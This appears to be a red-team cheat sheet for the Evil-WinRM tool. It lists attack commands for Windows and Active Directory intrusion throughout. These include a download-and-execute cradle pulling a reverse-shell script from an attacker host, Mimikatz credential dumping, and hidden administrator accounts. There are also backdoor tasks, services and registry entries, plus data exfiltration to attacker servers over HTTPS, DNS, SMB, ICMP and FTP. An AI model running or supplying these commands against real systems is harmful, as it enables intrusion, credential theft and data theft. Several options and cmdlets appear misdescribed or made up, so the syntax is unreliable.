# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# Evil-WinRM

Evil-WinRM is a powerful post-exploitation tool designed to interact with Windows Remote Management (WinRM) services. It is frequently used in penetration testing, especially in Active Directory environments, to gain and maintain access to Windows systems. This ultimate cheat sheet provides an exhaustive list of Evil-WinRM commands, usage scenarios, and advanced penetration testing techniques.

## Basic Syntax
```bash
evil-winrm -i <target_ip> -u <username> -p <password> [options]
```

## Core Options
- `-i <target_ip>`: Specifies the target IP address.
- `-u <username>`: Specifies the username.
- `-p <password>`: Specifies the password.
- `-H <hash>`: Pass-the-hash (PTH) mode using an NTLM hash.
- `-k`: Kerberos authentication.
- `-s <scripts>`: Load PowerShell scripts from a specified directory.
- `-S <secure>`: Use SSL (HTTPS) for the connection.
- `-P <port>`: Specifies the WinRM port (default is 5985 for HTTP and 5986 for HTTPS).
- `-c <command>`: Executes a single command on the target system.
- `-x <command>`: Executes a command and exits immediately.
- `-X`: Execute a command and get output in real-time.

# Commands and Use Cases

1. **Interactive Shell**: Starts an interactive PowerShell session on the target machine.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password>
    ```
2. **Pass-the-Hash Authentication**: Authenticates using NTLM hash instead of a password.
    ```bash
    evil-winrm -i <target_ip> -u <username> -H <ntlm_hash>
    ```
3. **Kerberos Authentication**: Uses Kerberos tickets for authentication.
    ```bash
    evil-winrm -i <target_ip> -u <username> -k
    ```
4. **Running a Command Remotely**: Executes a single command on the target and displays the output.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "ipconfig /all"
    ```
5. **Executing a Command and Exiting**: Executes a command and exits immediately after displaying the output.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -x "whoami"
    ```
6. **Loading and Executing PowerShell Scripts**: Loads and executes PowerShell scripts from a specified directory on the attacker’s machine.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -s /path/to/scripts
    ```
7. **Using SSL for Secure Communication**: Establishes a secure connection using SSL (HTTPS).
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -S
    ```
8. **Specifying a Custom Port**: Connects to the WinRM service on a non-default port.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -P 5986
    ```
9. **Uploading Files to the Target**: Uploads a file from the attacker's machine to the target system.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "upload /path/to/local/file /path/to/remote/destination"
    ```
10. **Downloading Files from the Target**: Downloads a file from the target system to the attacker's machine.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "download /path/to/remote/file /path/to/local/destination"
    ```
11. **Executing Commands with Real-Time Output**: Executes a command and provides real-time output.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -X "Get-Process"
    ```
12. **Connecting via a SOCKS Proxy**: Routes the connection through a SOCKS proxy.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -proxy <proxy_ip:proxy_port>
    ```
13. **Running Commands with Elevated Privileges**: Attempts to execute a command with elevated privileges.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "powershell Start-Process cmd -ArgumentList '/c whoami' -Verb RunAs"
    ```
14. **Shell Escape for Advanced Operations**: Escapes to a full PowerShell session for more advanced operations, such as loading scripts from a remote server.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password>
    PS> powershell -ExecutionPolicy Bypass -NoProfile -Command "iex(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/Invoke-PowerShellTcp.ps1')"
    ```

# Penetration Testing Techniques

#### Credential Harvesting

1. **Dumping Credentials from LSASS**: Executes Mimikatz to dump credentials stored in LSASS.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"
    ```
2. **Harvesting Cached Credentials**: Harvests cached Kerberos tickets for further attacks.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-Mimikatz -Command 'sekurlsa::tickets /export'"
    ```
3. **Extracting Hashes from SAM Database**: Extracts password hashes from the SAM database using Mimikatz.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "reg save hklm\\sam sam.save"
    evil-winrm -i <target_ip> -u <username> -p <password> -c "reg save hklm\\system system.save"
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-Mimikatz -Command 'lsadump::sam /system:system.save /sam:sam.save'"
    ```
4. **Credential Harvesting from Web Browsers**: Executes a PowerShell script to harvest stored web credentials.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-WebCredentialHarvester"
    ```
5. **Capturing Cleartext Passwords**: Phishes cleartext passwords by redirecting users to a fake login page.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-CredentialPhish -URL http://<attacker_ip>/login"
    ```

#### Privilege Escalation

1. **Enumerating Privileges**: Lists the privileges associated with the current user.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "whoami /priv"
    ```
2. **Finding Vulnerable Services**: Identifies services that are configured to start automatically but are currently stopped, which might be leveraged for privilege escalation.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and $_.Status -eq 'Stopped'}"
    ```
3. **Exploiting Misconfigured Services**: Creates a new service that runs with elevated privileges, potentially leading to privilege escalation.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "New-Service -Name 'Escalation' -BinaryPathName 'C:\Windows\System32\cmd.exe /c whoami' -Credential (New-Object System.Management.Automation.PSCredential('admin', (ConvertTo-SecureString 'password' -AsPlainText -Force)))"
    ```
4. **Abusing Weak Folder Permissions**: Modifies folder permissions to allow writing to a directory, enabling malicious DLL injection or binary replacement.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "icacls 'C:\Program Files\VulnerableApp' /grant Everyone:F"
    ```
5. **Exploiting Scheduled Tasks**: Creates a scheduled task that runs with SYSTEM privileges every minute, allowing privilege escalation.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "schtasks /create /tn 'Escalation' /tr 'C:\Windows\System32\cmd.exe /c whoami' /sc minute /mo 1 /ru SYSTEM"
    ```
6. **Escaping User Mode with UAC Bypass**: Executes a PowerShell script to bypass User Account Control (UAC) and escalate privileges to Administrator.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-UACBypass"
    ```

#### Lateral Movement

1. **Enumerating Domain Trusts**: Lists domain trusts within the Active Directory environment, identifying potential paths for lateral movement.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Get-DomainTrust"
    ```
2. **Listing Domain Controllers**: Lists all domain controllers in the domain, useful for planning lateral movement.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Get-ADDomainController -Filter *"
    ```
3. **Enumerating Shares on Remote Hosts**:
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-ShareFinder"
    ```
 Enumerates SMB shares on remote hosts, identifying potentially sensitive data or further attack vectors.

4. **Executing Commands on Remote Hosts**: Executes a PowerShell command on a remote host within the same domain.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-Command -ComputerName <remote_host> -ScriptBlock {ipconfig /all}"
    ```
5. **Pass-the-Hash for Lateral Movement**: Uses Pass-the-Hash to move laterally to another machine within the network.
    ```bash
    evil-winrm -i <remote_host> -u <username> -H <ntlm_hash>
    ```
6. **Pivoting Through Multiple Hosts**: Moves laterally through an intermediate host to reach a final target.
    ```bash
    evil-winrm -i <intermediate_host> -u <username> -p <password> -c "Invoke-Command -ComputerName <final_target_host> -ScriptBlock {ipconfig /all}"
    ```

#### Persistence

1. **Creating a Persistent Backdoor with Scheduled Tasks**: Creates a scheduled task that runs a PowerShell backdoor script each time the system starts.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "schtasks /create /tn 'Backdoor' /tr 'powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\backdoor.ps1' /sc onstart /ru SYSTEM"
    ```
2. **Maintaining Access with a Hidden User Account**: Creates a hidden user account and adds it to the Administrators group, maintaining persistent access.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "net user hiddenuser password123 /add & net localgroup Administrators hiddenuser /add"
    ```
3. **Adding a Startup Script for Persistence**: Adds a startup script to the Windows registry, ensuring the backdoor script runs on each login.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Backdoor' -Value 'C:\backdoor.ps1'"
    ```
4. **Creating a Persistent Service**: Creates a new service that runs a PowerShell script with SYSTEM privileges on every system startup.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "New-Service -Name 'PersistentService' -BinaryPathName 'powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\backdoor.ps1' -StartupType Automatic"
    ```
5. **Maintaining Access via WMI Event Subscription**: Establishes a WMI event subscription to trigger the backdoor script every 60 seconds.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-WmiEventSubscription -Script 'C:\backdoor.ps1' -TriggerType Interval -TriggerInterval 60"
    ```
6. **Establishing a Kerberos Backdoor**: Adds a hidden user account with administrative privileges to the Kerberos ticket-granting system for persistent access.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Add-KerberosBackdoor -Username hiddenuser -Password password123 -Admin"
    ```

#### Data Exfiltration

1. **Exfiltrating Data via HTTPS**: Exfiltrates sensitive data from the target system to an attacker's HTTPS server.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-WebRequest -Uri 'https://<attacker_ip>/data' -Method POST -Body (Get-Content C:\sensitive_data.txt)"
    ```
2. **Using DNS Tunneling for Data Exfiltration**: Exfiltrates data using DNS tunneling, which is often less detectable by network security devices.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-DNSTunnelExfil -Data (Get-Content C:\sensitive_data.txt) -Domain 'attacker.com'"
    ```
3. **Exfiltrating Data to a Remote SMB Share**: Copies sensitive data to an attacker-controlled SMB share.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Copy-Item C:\sensitive_data.txt \\<attacker_ip>\share\sensitive_data.txt"
    ```
4. **Encoding and Exfiltrating Data via ICMP**: Encodes and exfiltrates data using ICMP echo requests.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-ICMPExfil -FilePath C:\sensitive_data.txt -TargetIP <attacker_ip>"
    ```
5. **Encrypting and Exfiltrating Data via FTP**: Encrypts sensitive data and exfiltrates it to an attacker-controlled FTP server.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-FTPExfil -FilePath C:\sensitive_data.txt -Server <attacker_ip> -Username attacker -Password password123"
    ```
6. **Steganographic Data Exfiltration**: Hides sensitive data within an image file using steganography before exfiltrating it.
    ```bash
    evil-winrm -i <target_ip> -u <username> -p <password> -c "Invoke-Steganography -FilePath C:\sensitive_data.txt -CoverImage C:\image.jpg -OutputImage C:\exfil.jpg"
    ```

# Resources

|**Name**|**URL**|
|---|---|
|Evil-WinRM GitHub Repository|https://github.com/Hackplayers/evil-winrm|
|Evil-WinRM Documentation|https://github.com/Hackplayers/evil-winrm/wiki|
|PowerSploit Documentation|https://github.com/PowerShellMafia/PowerSploit|
|Mimikatz Documentation|https://github.com/gentilkiwi/mimikatz|
|Red Teaming with Evil-WinRM|https://pentestlab.blog/2019/09/23/evil-winrm/|
|Post-Exploitation with PowerShell|https://www.offensive-security.com/metasploit-unleashed/post-exploitation-powershell/|
|Data Exfiltration Techniques|https://www.fireeye.com/blog/threat-research/2019/01/exfiltration-over-alternate-protocols.html|
|Pass-the-Hash Attacks|https://attack.mitre.org/techniques/T1550/002/|
|Kerberos Attacks|https://adsecurity.org/?page_id=1821|
|Privilege Escalation in Windows|https://pentestlab.blog/2017/04/19/windows-privilege-escalation/|
|Windows Persistence Techniques|https://ired.team/offensive-security/persistence|